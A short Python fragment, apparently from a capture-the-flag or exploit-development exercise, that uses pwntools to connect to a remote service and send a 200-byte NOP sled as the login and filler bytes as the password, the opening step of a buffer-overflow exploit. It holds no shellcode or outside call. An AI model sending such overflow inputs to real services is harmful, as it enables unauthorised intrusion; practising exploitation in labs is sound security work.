
from pwn import *

def getJunk(es):
    r = es.remoteConnect()
    NOPSLED = b"\x90" * 200
    LOGIN = NOPSLED
    # LOGIN = "B"*200
    res = r.recv()
    r.send(LOGIN)
    # print(res)
    PASSWORD = b"DDDDDDDDDDDD"
    res = r.recv()
    r.send(PASSWORD)
    # print(res)
    res = r.recv()
    res = r.recv()
